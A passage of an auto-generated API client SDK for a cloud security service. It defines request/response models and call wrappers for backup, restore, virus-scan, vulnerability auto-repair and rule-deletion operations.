 * @param request CreateUniBackupPolicyRequest
 * @return CreateUniBackupPolicyResponse
 */
async function createUniBackupPolicy(request: CreateUniBackupPolicyRequest): CreateUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniBackupPolicyWithOptions(request, runtime);
}

model CreateUniRestorePlanRequest {
  database?: string(name='Database', description='The name of the database.', example='qtc'),
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the Hybrid Backup Recovery (HBR) agent that is used to restore the data of the database on your server.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ac457b30598d11ed800000163e02****'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the ID.

This parameter is required.', example='123'),
  resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='925702.0'),
  resetTime?: string(name='ResetTime', description='The point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='2022-10-29 01:06:24'),
  restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the information.', example='{"files": {"qtc":"F:\\\\\\\\database\\\\\\\\qtc.mdf","qtc_log":"F:\\\\\\\\database\\\\\\\\qtc_0.ldf"},
"name":"qtc"}'),
  timePoint?: long(name='TimePoint', description='The point in time to which you want to restore data.

>  You can call the [DescribeRestorePlans](~~DescribeRestorePlans~~) operation to query the point in time.

This parameter is required.', example='1656957664000'),
}

model CreateUniRestorePlanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model CreateUniRestorePlanResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateUniRestorePlanResponseBody(name='body'),
}

/**
 * @summary Creates a restoration task for a database.
 *
 * @param request CreateUniRestorePlanRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateUniRestorePlanResponse
 */
async function createUniRestorePlanWithOptions(request: CreateUniRestorePlanRequest, runtime: Util.RuntimeOptions): CreateUniRestorePlanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.resetScn)) {
    query['ResetScn'] = request.resetScn;
  }
  if (!Util.isUnset(request.resetTime)) {
    query['ResetTime'] = request.resetTime;
  }
  if (!Util.isUnset(request.restoreInfo)) {
    query['RestoreInfo'] = request.restoreInfo;
  }
  if (!Util.isUnset(request.timePoint)) {
    query['TimePoint'] = request.timePoint;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniRestorePlan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a restoration task for a database.
 *
 * @param request CreateUniRestorePlanRequest
 * @return CreateUniRestorePlanResponse
 */
async function createUniRestorePlan(request: CreateUniRestorePlanRequest): CreateUniRestorePlanResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniRestorePlanWithOptions(request, runtime);
}

model CreateUserSettingRequest {
  alertLevels?: string(name='AlertLevels', description='The severities of alerts.', example='high,low'),
  invalidWarningKeepDays?: int32(name='InvalidWarningKeepDays', description='The number of days during which you want to retain invalid alerts.', example='7'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='112.48.16.***'),
}

model CreateUserSettingResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A1EE5AFD-0867-5F4F-9BE1-EBDD2C35****'),
}

model CreateUserSettingResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateUserSettingResponseBody(name='body'),
}

/**
 * @summary Creates the risk level settings for baseline check items.
 *
 * @param request CreateUserSettingRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateUserSettingResponse
 */
async function createUserSettingWithOptions(request: CreateUserSettingRequest, runtime: Util.RuntimeOptions): CreateUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alertLevels)) {
    query['AlertLevels'] = request.alertLevels;
  }
  if (!Util.isUnset(request.invalidWarningKeepDays)) {
    query['InvalidWarningKeepDays'] = request.invalidWarningKeepDays;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates the risk level settings for baseline check items.
 *
 * @param request CreateUserSettingRequest
 * @return CreateUserSettingResponse
 */
async function createUserSetting(request: CreateUserSettingRequest): CreateUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUserSettingWithOptions(request, runtime);
}

model CreateVirusScanOnceTaskRequest {
  scanPath?: [ string ](name='ScanPath', description='The information about the scan path that is required for a custom scan.'),
  scanType?: string(name='ScanType', description='The type of the virus scan. Valid values:

*   **system**: system scan.
*   **user**: custom scan.', example='system'),
  selectionKey?: string(name='SelectionKey', description='The key that stores the asset information.

> You can call the [GetAssetSelectionConfig](~~GetAssetSelectionConfig~~) operation to obtain the key value.', example='845de1ec-4b08-42e1-b564-31321e48xxxx'),
}

model CreateVirusScanOnceTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model CreateVirusScanOnceTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateVirusScanOnceTaskResponseBody(name='body'),
}

/**
 * @summary Creates a one-time virus scan task that is immediately executed.
 *
 * @param request CreateVirusScanOnceTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateVirusScanOnceTaskResponse
 */
async function createVirusScanOnceTaskWithOptions(request: CreateVirusScanOnceTaskRequest, runtime: Util.RuntimeOptions): CreateVirusScanOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanPath)) {
    query['ScanPath'] = request.scanPath;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateVirusScanOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a one-time virus scan task that is immediately executed.
 *
 * @param request CreateVirusScanOnceTaskRequest
 * @return CreateVirusScanOnceTaskResponse
 */
async function createVirusScanOnceTask(request: CreateVirusScanOnceTaskRequest): CreateVirusScanOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createVirusScanOnceTaskWithOptions(request, runtime);
}

model CreateVulAutoRepairConfigRequest {
  reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='TestAutoRepair'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values: -**cve**: Linux software vulnerability -**sys**: Windows system vulnerability

This parameter is required.', example='cve'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.

This parameter is required.', example='CVE-2018-25032:zlib 1.2.11 memory corruption'),
      name?: string(name='Name', description='The name of the vulnerability.

This parameter is required.', example='anolisos:8.4:ANSA-2022:0001'),
    }
  ](name='VulAutoRepairConfigList', description='The vulnerabilities that can be automatically fixed.

This parameter is required.'),
}

model CreateVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateVulAutoRepairConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateVulAutoRepairConfigResponseBody(name='body'),
}

/**
 * @summary Creates a list of vulnerabilities that can be automatically fixed. After the list is created, you can select the list when you create a vulnerability fixing task on the Playbook page.
 *
 * @param request CreateVulAutoRepairConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateVulAutoRepairConfigResponse
 */
async function createVulAutoRepairConfigWithOptions(request: CreateVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): CreateVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vulAutoRepairConfigList)) {
    query['VulAutoRepairConfigList'] = request.vulAutoRepairConfigList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a list of vulnerabilities that can be automatically fixed. After the list is created, you can select the list when you create a vulnerability fixing task on the Playbook page.
 *
 * @param request CreateVulAutoRepairConfigRequest
 * @return CreateVulAutoRepairConfigResponse
 */
async function createVulAutoRepairConfig(request: CreateVulAutoRepairConfigRequest): CreateVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createVulAutoRepairConfigWithOptions(request, runtime);
}

model DeleteAntiBruteForceRuleRequest {
  ids?: [ long ](name='Ids', description='The IDs of the defense rules against brute-force attacks to delete.

This parameter is required.'),
}

model DeleteAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model DeleteAntiBruteForceRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteAntiBruteForceRuleResponseBody(name='body'),
}

/**
 * @summary Deletes the specified defense rules against brute-force attacks.
 *
 * @param request DeleteAntiBruteForceRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteAntiBruteForceRuleResponse
 */
async function deleteAntiBruteForceRuleWithOptions(request: DeleteAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): DeleteAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the specified defense rules against brute-force attacks.
 *
 * @param request DeleteAntiBruteForceRuleRequest
 * @return DeleteAntiBruteForceRuleResponse
 */
async function deleteAntiBruteForceRule(request: DeleteAntiBruteForceRuleRequest): DeleteAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAntiBruteForceRuleWithOptions(request, runtime);
}

model DeleteAttestorRequest {
  name?: string(name='Name', description='The name of the witness.', example='attestor'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='221.214.XXX.XX'),
}

model DeleteAttestorResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CD380235-A0B8-540D-A0D5-D6288446****'),
}

model DeleteAttestorResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteAttestorResponseBody(name='body'),
}

/**
 * @summary Deletes a witness.
 *
 * @param request DeleteAttestorRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteAttestorResponse
 */
async function deleteAttestorWithOptions(request: DeleteAttestorRequest, runtime: Util.RuntimeOptions): DeleteAttestorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAttestor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a witness.
 *
 * @param request DeleteAttestorRequest
 * @return DeleteAttestorResponse
 */
async function deleteAttestor(request: DeleteAttestorRequest): DeleteAttestorResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAttestorWithOptions(request, runtime);
}

model DeleteAutoTagRulesRequest {
  ruleIdList?: string(name='RuleIdList', description='The ID of the asset auto-tagging rule. Separate multiple IDs with commas (,).

>  You can call the [ListAutoTagRules](~~ListAutoTagRules~~) operation to query the ID.

This parameter is required.', example='2331,56,5644'),
}

model DeleteAutoTagRulesResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CD380235-A0B8-540D-A0D5-D6288446****'),
}

model DeleteAutoTagRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteAutoTagRulesResponseBody(name='body'),
}

/**
 * @summary Deletes asset auto-tagging rules that are created by using the feature of asset management rules. You can create rules on the System Configuration > Feature Settings > Multi-cloud Configuration Management > Asset Management Rule page in the Security Center console.
 *
 * @param request DeleteAutoTagRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteAutoTagRulesResponse
 */
async function deleteAutoTagRulesWithOptions(request: DeleteAutoTagRulesRequest, runtime: Util.RuntimeOptions): DeleteAutoTagRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleIdList)) {
    query['RuleIdList'] = request.ruleIdList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAutoTagRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes asset auto-tagging rules that are created by using the feature of asset management rules. You can create rules on the System Configuration > Feature Settings > Multi-cloud Configuration Management > Asset Management Rule page in the Security Center console.
 *
 * @param request DeleteAutoTagRulesRequest
 * @return DeleteAutoTagRulesResponse
 */
async function deleteAutoTagRules(request: DeleteAutoTagRulesRequest): DeleteAutoTagRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAutoTagRulesWithOptions(request, runtime);
}

model DeleteBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy that you want to delete.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='12'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy that you want to delete. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
}

model DeleteBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Deletes an anti-ransomware policy.
 *
 * @param request DeleteBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteBackupPolicyResponse
 */
async function deleteBackupPolicyWithOptions(request: DeleteBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes an anti-ransomware policy.
 *
 * @param request DeleteBackupPolicyRequest
 * @return DeleteBackupPolicyResponse
 */
async function deleteBackupPolicy(request: DeleteBackupPolicyRequest): DeleteBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyWithOptions(request, runtime);
}

model DeleteBackupPolicyMachineRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='11'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.

This parameter is required.', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.

> You must specify at least one of the `UuidList` and `Uuid` parameters.', example='083036e9-8411-4a9d-83af-9acbd****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.

> You must specify at least one of the `UuidList` and `Uuid` parameters.'),
}

model DeleteBackupPolicyMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DeleteBackupPolicyMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteBackupPolicyMachineResponseBody(name='body'),
}

/**
 * @summary Disables a specified anti-ransomware policy that is applied to specified servers and uninstalls the anti-ransomware agent from the servers. If the backup vaults of the servers contain only backup data of the servers, the backup vaults are deleted.
 *
 * @param request DeleteBackupPolicyMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteBackupPolicyMachineResponse
 */
async function deleteBackupPolicyMachineWithOptions(request: DeleteBackupPolicyMachineRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicyMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Disables a specified anti-ransomware policy that is applied to specified servers and uninstalls the anti-ransomware agent from the servers. If the backup vaults of the servers contain only backup data of the servers, the backup vaults are deleted.
 *
 * @param request DeleteBackupPolicyMachineRequest
 * @return DeleteBackupPolicyMachineResponse
 */
async function deleteBackupPolicyMachine(request: DeleteBackupPolicyMachineRequest): DeleteBackupPolicyMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyMachineWithOptions(request, runtime);
}

model DeleteBackupSnapshotRequest {
  backupRegionIdList?: [ string ](name='BackupRegionIdList', description='The regions for backup.'),
  backupSnapshotList?: [ 
    {
      clientId?: string(name='ClientId', description='The ID of the Cloud Backup client.

>  You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to query the ID.

This parameter is required.', example='c-000a4h33w14ka8xagb2s'),
      instanceId?: string(name='InstanceId', description='The ID of the server.

This parameter is required.', example='i-j6cj8vyajp1fo4atxkae'),
      regionId?: string(name='RegionId', description='The region in which Security Center is deployed. Valid values:

*   **cn-hangzhou**: China (Hangzhou).
*   **ap-southeast-1**: Singapore.
*   **cn-beijing**: China (Beijing).

This parameter is required.', example='cn-beijing'),
      snapshotId?: string(name='SnapshotId', description='The ID of the snapshot that you want to delete.

>  You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to query the ID.

This parameter is required.', example='s-000f9p6r5trm6u4dc1iq'),
      sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: Elastic Compute Service (ECS) files.
*   **OSS**: Object Storage Service (OSS) buckets.
*   **NAS**: File Storage NAS (NAS) file systems.
*   **OTS_TABLE**: Tablestore instances.

This parameter is required.', example='ECS_FILE'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault that is used in the restoration task.

>  You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to query the ID.

This parameter is required.', example='v-0004vhwcs2pmacfzrzt5'),
    }
  ](name='BackupSnapshotList', description='The backup snapshots.'),
  retainLatestSnapshot?: boolean(name='RetainLatestSnapshot', description='Specifies whether to retain the latest snapshot. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteBackupSnapshotResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model DeleteBackupSnapshotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteBackupSnapshotResponseBody(name='body'),
}

/**
 * @summary Deletes a backup snapshot that is created for anti-ransomware.
 *
 * @param request DeleteBackupSnapshotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteBackupSnapshotResponse
 */
async function deleteBackupSnapshotWithOptions(request: DeleteBackupSnapshotRequest, runtime: Util.RuntimeOptions): DeleteBackupSnapshotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.backupRegionIdList)) {
    query['BackupRegionIdList'] = request.backupRegionIdList;
  }
  if (!Util.isUnset(request.backupSnapshotList)) {
    query['BackupSnapshotList'] = request.backupSnapshotList;
  }
  if (!Util.isUnset(request.retainLatestSnapshot)) {
    query['RetainLatestSnapshot'] = request.retainLatestSnapshot;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupSnapshot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a backup snapshot that is created for anti-ransomware.
 *
 * @param request DeleteBackupSnapshotRequest
 * @return DeleteBackupSnapshotResponse
 */
async function deleteBackupSnapshot(request: DeleteBackupSnapshotRequest): DeleteBackupSnapshotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupSnapshotWithOptions(request, runtime);
}

model DeleteBaselineCheckWhiteRecordRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of check items.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  recordIds?: [ long ](name='RecordIds', description='The IDs of the whitelist records.'),
  source?: string(name='Source', description='The data source. Valid values:

*   **default**: host baseline
*   **agentless**: agentless detection', example='agentless'),
}

model DeleteBaselineCheckWhiteRecordResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
}

model DeleteBaselineCheckWhiteRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteBaselineCheckWhiteRecordResponseBody(name='body'),
}

/**
 * @summary Deletes the whitelist record for a baseline check item.
 *
 * @param request DeleteBaselineCheckWhiteRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteBaselineCheckWhiteRecordResponse
 */
async function deleteBaselineCheckWhiteRecordWithOptions(request: DeleteBaselineCheckWhiteRecordRequest, runtime: Util.RuntimeOptions): DeleteBaselineCheckWhiteRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.recordIds)) {
    query['RecordIds'] = request.recordIds;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBaselineCheckWhiteRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the whitelist record for a baseline check item.
 *
 * @param request DeleteBaselineCheckWhiteRecordRequest
 * @return DeleteBaselineCheckWhiteRecordResponse
 */
async function deleteBaselineCheckWhiteRecord(request: DeleteBaselineCheckWhiteRecordRequest): DeleteBaselineCheckWhiteRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBaselineCheckWhiteRecordWithOptions(request, runtime);
}

model DeleteBinarySecurityPolicyRequest {
  name?: string(name='Name', description='The name of the binary security policy.', example='policy-auto-bfu7pm'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.XXX.XXX'),
}

model DeleteBinarySecurityPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A6CFADC0-1167-521A-9284-8CD8034C****'),
}

model DeleteBinarySecurityPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteBinarySecurityPolicyResponseBody(name='body'),
}

/**
 * @summary Deletes a binary security policy from the container signature feature.
 *
 * @param request DeleteBinarySecurityPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteBinarySecurityPolicyResponse
 */
async function deleteBinarySecurityPolicyWithOptions(request: DeleteBinarySecurityPolicyRequest, runtime: Util.RuntimeOptions): DeleteBinarySecurityPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.name)) {
